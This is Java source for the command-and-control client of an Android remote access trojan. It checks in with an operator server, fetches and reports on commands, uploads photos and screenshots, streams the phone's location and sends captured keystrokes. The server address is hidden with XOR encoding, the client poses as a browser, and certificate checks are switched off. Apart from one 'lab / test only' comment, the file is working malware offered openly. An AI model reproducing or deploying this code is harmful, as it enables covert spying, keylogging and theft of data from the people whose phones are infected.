package com.company.rat;

import android.util.Log;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.security.cert.X509Certificate;
import javax.net.ssl.*;

/**
 * HTTP client that speaks the same protocol as the Windows stub:
 *   GET  /checkin?id=<id>&info=<info>
 *   GET  /cmd?id=<id>
 *   GET  /result?id=<id>&data=<urlencoded>
 *   POST /upload?id=<id>          multipart/form-data
 *   POST /android/keylog?id=<id>  raw text body
 *
 * C2 host + auth are read from assets/config.json at runtime so the APK
 * does not need to be rebuilt when the server address changes.
 * config.json format: {"host":"https://192.168.1.1:4444","auth":"changeme","trust_all":true}
 */
public class C2Client {

    private static final String TAG    = "C2Client";
    private static final int    TIMEOUT = 10_000;

    private final String host;
    private final String authKey;
    private final boolean trustAll;

    /** Load config from assets/config.json. Host is XOR-encoded in host_xor field. */
    public static C2Client fromAssets(android.content.Context ctx) {
        try {
            java.io.InputStream is = ctx.getAssets().open("config.json");
            byte[] buf = new byte[is.available()];
            is.read(buf);
            is.close();
            String json = new String(buf, "UTF-8");
            // Prefer decoded host_xor over plaintext host
            String hostEnc = extractJson(json, "host_xor");
            String host    = hostEnc.isEmpty() ? extractJson(json, "host") : d(hostEnc);
            String auth    = extractJson(json, "auth");
            String trustStr = extractJson(json, "trust_all");
            boolean trust  = !"false".equalsIgnoreCase(trustStr);
            return new C2Client(host, auth, trust);
        } catch (Exception e) {
            // Fallback: "https://192.168.1.1:4444" XOR 0x42 — no plaintext URL in DEX
            return new C2Client(d("2a36363231786d6d737b706c73747a6c736c737876767676"), "changeme", true);
        }
    }

    private static String d(String h) {
        byte[] out = new byte[h.length() / 2];
        for (int i = 0; i < out.length; i++) {
            out[i] = (byte) (Integer.parseInt(h.substring(i * 2, i * 2 + 2), 16) ^ 0x42);
        }
        return new String(out, StandardCharsets.UTF_8);
    }

    private static String extractJson(String json, String key) {
        // Minimal JSON field extractor — no external deps needed
        String pattern = "\"" + key + "\"";
        int i = json.indexOf(pattern);
        if (i < 0) return "";
        i = json.indexOf(':', i + pattern.length());
        if (i < 0) return "";
        i++;
        while (i < json.length() && (json.charAt(i) == ' ' || json.charAt(i) == '\t')) i++;
        if (i >= json.length()) return "";
        if (json.charAt(i) == '"') {
            int end = json.indexOf('"', i + 1);
            return end > i ? json.substring(i + 1, end) : "";
        }
        int end = i;
        while (end < json.length() && json.charAt(end) != ',' && json.charAt(end) != '}') end++;
        return json.substring(i, end).trim();
    }

    public C2Client(String host, String authKey, boolean trustAll) {
        this.host     = host.replaceAll("/$", "");
        this.authKey  = authKey;
        this.trustAll = trustAll;
        if (trustAll) installTrustAll();
    }

    // ── trust-all for self-signed cert (lab / test only) ─────────────────────

    private void installTrustAll() {
        try {
            TrustManager[] tm = new TrustManager[]{
                new X509TrustManager() {
                    public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
                    public void checkClientTrusted(X509Certificate[] c, String a) {}
                    public void checkServerTrusted(X509Certificate[] c, String a) {}
                }
            };
            SSLContext ctx = SSLContext.getInstance("TLS");
            ctx.init(null, tm, new java.security.SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(ctx.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier((h, s) -> true);
        } catch (Exception e) {
            Log.e(TAG, "trustAll failed", e);
        }
    }

    // ── helpers ───────────────────────────────────────────────────────────────

    private HttpURLConnection open(String path) throws IOException {
        URL url = new URL(host + path);
        HttpURLConnection c = (HttpURLConnection) url.openConnection();
        c.setConnectTimeout(TIMEOUT);
        c.setReadTimeout(TIMEOUT);
        c.setRequestProperty("X-Auth", authKey);
        c.setRequestProperty("User-Agent", "Mozilla/5.0");
        return c;
    }

    private String readBody(HttpURLConnection c) throws IOException {
        InputStream in = c.getResponseCode() < 400
                ? c.getInputStream() : c.getErrorStream();
        if (in == null) return "";
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        byte[] b = new byte[4096];
        int n;
        while ((n = in.read(b)) != -1) buf.write(b, 0, n);
        return buf.toString("UTF-8").trim();
    }

    // ── public API ────────────────────────────────────────────────────────────

    /** Register / heartbeat. Returns HTTP status. */
    public int checkin(String id, String info) {
        try {
            HttpURLConnection c = open("/checkin?id=" + enc(id) + "&info=" + enc(info));
            int code = c.getResponseCode();
            c.disconnect();
            return code;
        } catch (Exception e) {
            Log.w(TAG, "checkin error: " + e.getMessage());
            return -1;
        }
    }

    /** Poll for a pending command. Returns empty string if none. */
    public String getCommand(String id) {
        try {
            HttpURLConnection c = open("/cmd?id=" + enc(id));
            String cmd = readBody(c);
            c.disconnect();
            return cmd;
        } catch (Exception e) {
            Log.w(TAG, "cmd error: " + e.getMessage());
            return "";
        }
    }

    /** Send a text result back. */
    public void sendResult(String id, String data) {
        try {
            HttpURLConnection c = open("/result?id=" + enc(id) + "&data=" + enc(data));
            c.getResponseCode();
            c.disconnect();
        } catch (Exception e) {
            Log.w(TAG, "result error: " + e.getMessage());
        }
    }

    /** Upload a file (photo, screenshot). Returns server filename or empty. */
    public String uploadFile(String id, byte[] data, String filename, String mime) {
        String boundary = "----AndroidBoundary" + System.currentTimeMillis();
        try {
            HttpURLConnection c = open("/upload?id=" + enc(id));
            c.setDoOutput(true);
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            try (OutputStream out = c.getOutputStream();
                 PrintWriter pw  = new PrintWriter(new OutputStreamWriter(out, StandardCharsets.UTF_8), true)) {

                pw.append("--").append(boundary).append("\r\n");
                pw.append("Content-Disposition: form-data; name=\"file\"; filename=\"")
                  .append(filename).append("\"\r\n");
                pw.append("Content-Type: ").append(mime).append("\r\n\r\n");
                pw.flush();
                out.write(data);
                out.flush();
                pw.append("\r\n--").append(boundary).append("--\r\n");
                pw.flush();
            }

            String resp = readBody(c);
            c.disconnect();
            return resp;
        } catch (Exception e) {
            Log.w(TAG, "upload error: " + e.getMessage());
            return "";
        }
    }

    /** POST lat,lon,acc to /android/location for live map tracking. Fire-and-forget. */
    public void postLocation(String id, String coords) {
        try {
            HttpURLConnection c = open("/android/location?id=" + enc(id));
            c.setDoOutput(true);
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "text/plain; charset=utf-8");
            byte[] body = coords.getBytes(StandardCharsets.UTF_8);
            c.setFixedLengthStreamingMode(body.length);
            try (OutputStream out = c.getOutputStream()) { out.write(body); }
            c.getResponseCode();
            c.disconnect();
        } catch (Exception ignored) {}
    }

    /** Send accumulated keylog text to the Android-specific endpoint. */
    public void sendKeylogs(String id, String logs) {
        try {
            HttpURLConnection c = open("/android/keylog?id=" + enc(id));
            c.setDoOutput(true);
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "text/plain; charset=utf-8");
            byte[] body = logs.getBytes(StandardCharsets.UTF_8);
            c.setFixedLengthStreamingMode(body.length);
            try (OutputStream out = c.getOutputStream()) { out.write(body); }
            c.getResponseCode();
            c.disconnect();
        } catch (Exception e) {
            Log.w(TAG, "keylog error: " + e.getMessage());
        }
    }

    private String enc(String s) {
        try { return URLEncoder.encode(s, "UTF-8"); }
        catch (Exception e) { return s; }
    }
}
